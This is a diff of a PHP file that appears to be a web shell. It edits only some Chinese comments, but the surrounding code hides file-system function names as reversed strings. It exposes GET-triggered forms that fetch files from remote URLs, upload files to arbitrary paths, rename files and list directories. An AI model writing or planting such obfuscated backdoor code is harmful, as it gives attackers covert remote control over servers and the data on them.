@@ -10,8 +10,8 @@ $cd=$sr("ridesolc");  //closedir
 $fpc=$sr("stnetnoc_tup_elif");  //file_put_contents
 $fgc=$sr("stnetnoc_teg_elif");  //file_get_contents
 $muf=$sr("elif_dedaolpu_evom");  //move_uploaded_file
-$dlform='<form method="post">FN:<input name="fn" size="20" type="text">URL:<input name="url" size="50" type="text"><input type="submit" value="ok"></form>';  //下载表单
-$ulform='<form method="post" enctype="multipart/form-data"><input name="uf" type="file">SP:<input name="sp" size="50" type="text"><input type="submit" value="ok"></form>';  //移动文件表单
+$dlform='<form method="post">FN:<input name="fn" size="20" type="text">URL:<input name="url" size="50" type="text"><input type="submit" value="ok"></form>';
+$ulform='<form method="post" enctype="multipart/form-data"><input name="uf" type="file">SP:<input name="sp" size="50" type="text"><input type="submit" value="ok"></form>';
 $rnform='<form method="post">ON:<input name="on" size="50" type="text">NN:<input name="nn" size="50" type="text"><input type="submit" value="ok"></form>';
 $lpform='<form method="post">DP:<input name="dp" size="50" type="text"><input type="submit" value="ok"></form>';
 $sfform='<form method="post">DF:<input name="df" size="50" type="text"><input type="submit" value="ok"></form>';
@@ -22,7 +22,7 @@ if($_GET['act']=='dl'){  //下载文件
 	}
 	exit;
 }
-if($_GET['act']=='ul'){  //上传文件文件
+if($_GET['act']=='ul'){  //上传文件
 	echo($ulform);
 	if($_SERVER['REQUEST_METHOD']=='POST'){
 		$sp=empty($_POST['sp'])?'./':$_POST['sp'].'/';
